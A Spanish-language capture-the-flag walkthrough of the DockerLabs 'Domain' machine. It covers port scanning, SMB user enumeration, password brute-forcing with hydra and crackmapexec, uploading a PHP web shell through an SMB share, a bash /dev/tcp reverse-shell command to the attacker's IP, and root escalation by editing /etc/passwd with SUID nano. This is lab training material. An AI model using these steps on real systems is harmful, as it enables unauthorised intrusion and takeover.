# [Domain](https://dockerlabs.es/)

## Despliegue

Primero desplegamos la máquina con ```bash auto_deploy.sh domain.tar``` (si no sabes en la página de DockerLabs ahí un pdf que lo explica).

## Reconocimiento

Una vez desplegada comprobamos que tenemos conectividad con ```ping -c 1 172.17.0.2``` 
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/af4d0189-b640-4576-aca6-3c02c75c9434)
<br>
`-c 1` ⮞ solo lo repite una vez<br>
<br>
Ahora vamos con el reconocimiento de nmap ```nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 172.17.0.2 -oG allPorts``` <br>
`-p-` ⮞ aplicar reconocimiento a todos los puertos <br>
`--open` ⮞ solo a los que estén abiertos <br>
`--min-rate 5000` ⮞ para enviar paquetes más rápido <br> 
`-sS` ⮞ para descubrir puertos de manera silenciosa y rápida <br> 
`-vvv` ⮞ conforme descubre un puerto nos lo muestra por pantalla <br> 
`-n` ⮞ no aplica la resolución DNS (tarda mucho en el caso de que no pongamos dicho parámetro)<br> 
`-Pn` ⮞ ignora si esta activa o no la IP<br> 
`-oG` ⮞ exportamos el resultado en formato grepeable (para extraer mejor los datos con herramientas como grep, awk)
<br>

Podemos ver los resultados en el archivo grepeable haciendo ```cat allPorts```, observamos que tan solo está abierto el puerto **80**, **445** y **139**
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/a1c0f66b-e114-4d9c-8b06-44d197ff9d93)
<br>
<br>

## Página Web (Puerto 80)

Al ver que está abierto el puerto 80 nos dirigimos al Navegador Web e introducimos la dirección IP como. podemos ver una página la cuál explica ¿Qué es samba?: 

<br>

![alt text](image.png)

<br>
<br>

## Samba (Puerto 445)
En primer lugar, listaremos los recursos compartidos con smbmap de la siguiente forma: `smbmap -H 172.17.0.2 -P 445`, observamos los siguientes recursos: 

<br>

![alt text](image-4.png)

<br>

Ahora intentamos enumerar posible usuario de la máquina Domain para posteriormente intentar hacer fuerza bruta al servicio de samba.
<br>

Lo haremos de la siguiente forma `enum4linux -a 172.17.0.2`, podemos ver que nos reporta 2 usuarios `james` y `bob`

<br>

![alt text](image-1.png)

<br>
<br>

## Hydra / Medusa
Una vez conocemos los posibles usuarios haremos un ataque de fuerza bruta al servicio samba usando hydra en primer lugar, usaremos el usuario bob `hydra -l bob -P /usr/share/wordlists/rockyou.txt smb://172.17.0.2`. <br> 
`-h` ⮞ dirección IP de la máquina victima <br>
`-u` ⮞ nombre del posible usuario <br> 
`-P` ⮞ ruta del rockyou. Para descargar el diccionario [rockyou](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)

<br>

Nos reporta el siguiente error: 

<br>

![alt text](image-2.png)

<br>

Por lo que debemos usar otra herramienta de fuerza bruta (medusa tampoco funciona), en este caso usaremos `crackmapexec` usando el siguiente comando `crackmapexec smb 172.17.0.2 -u bob -p /usr/share/wordlists/rockyou.txt`, podemos ver que usando `crackmapexec` no nos sale el error de antes, y nos reporta lo siguiente:

<br>

![alt text](image-3.png)

<br>
<br>

## Samba (Puerto 445)
Una vez conocemos el usuario y su contraseña probamos a entrar al recurso compartido html de la máquina Domain con smbclient de la siguiente forma `smbclient //172.17.0.2/html -U bob`, y a continuación nos pedirá la contraseña. Podemos ver que dentro de este recurso se encuentra el índice de la página web lo que nos da ha entender que todo lo que haya en esa carpeta será accesible desde dicho servidor.

<br>
<br>

Por lo que deberíamos hacer ahora sería enviarnos una revshell a nuestra máquina de atacante, lo haríamos de la siguiente forma. En primer lugar nos creamos un `cmd.php` que contendrá lo siguiente:

<br>

![alt text](image-5.png)

<br>

Ahora lo podremos dentro de la carpeta compartida (`html`) a través de samba dentro de la máquina Domain. Debemos logearnos a samba como lo hicimos anteriormente (`smbclient`) en la carpeta donde tenemos nuestro `cmd.php`, una vez dentro del samba hacemos `put cmd.php`, y listo ya estaría el archivo subido al servidor web.

<br>

Accederemos a el poniendo `http://172.17.0.2/cmd.php`, y ahora abusaremos de la vulnerabilidad (RCE), podemos ver que si le pasamos el parámetro `id` de la siguiente manera `http://172.17.0.2/cmd.php?cmd=id` nos da esta respuesta:

<br>

![alt text](image-6.png)

<br>

Por lo que ahora nos mandaríamos una revshell poniendo lo siguiente en el buscador `http://172.17.0.2/cmd.php?cmd=bash -c 'bash -i >%26 /dev/tcp/172.17.0.1/443 0>%261'`, recuerda que debemos estar en escucha en un puerto poniendo en la terminal lo siguiente `nc -nlvp 443`:

<br>

![alt text](image-7.png)

<br>
<br>

## Escala de Privilegios
Antes de empezar a probar como escalar privilegios haremos un sencillo tratamiento de la tty poniendo en orden lo siguiente: <br>
1-.`script /dev/null -c bash` <br>
2-.`Pulsamos CTRL+Z` <br>
3-.`stty raw -echo; fg` <br>
4-.`reset xterm` <br>
5-.`export SHELL=bash && export TERM=xterm` <br>

Comprobamos que hemos podido ingresar a la Máquina Víctima como **www-data**, hacemos un `cat /etc/passwd | grep "sh$"` para ver los posibles usuarios: 

<br>

![alt text](image-8.png)

<br>

Vemos que también se encuentra el usuario `bob` probamos a autenticarnos haciendo `su bob` y poniendo la contraseña y listo somos el usuario `bob`:

<br>

![alt text](image-9.png)

<br>

Si ejecutamos `sudo -l` podemos ver que no podemos correr nada como sudo.<br>

`-l` ⮞ listar comandos que podemos ejecutar como sudo <br>

<br>

Hacemos la siguiente comprobación para ver la posible escalada ejecutando `find / -perm -4000 2>/dev/null`

<br>

`/` ⮞ buscamos desde la raíz <br>
`-perm -4000` ⮞ mostrar los permisos SUID <br>
`2>/dev/null` ⮞ para que no nos muestre los errores <br>

<br>

Y vemos que tenemos permiso SUID sobre `/usr/bin/nano`: 

<b>

![alt text](image-10.png)

<br>

Por lo que podríamos hacer con nano es modificar cualquier fichero ya que contamos con permisos SUID, lo que se nos ocurriría sería modificar el `/etc/passwd`, lo que tendríamos que hacer sería quitarle la `x` al root por lo que podríamos logearnos como root sin proporcionar contraseña. Haríamos `nano /etc/passwd` y el archivo quedaría así:

<br>

![alt text](image-13.png)

<br>

Y si hacemos `su root` comprobamos que no nos pedirá contraseña y listo ya seremos root.

<br>

![alt text](image-14.png)
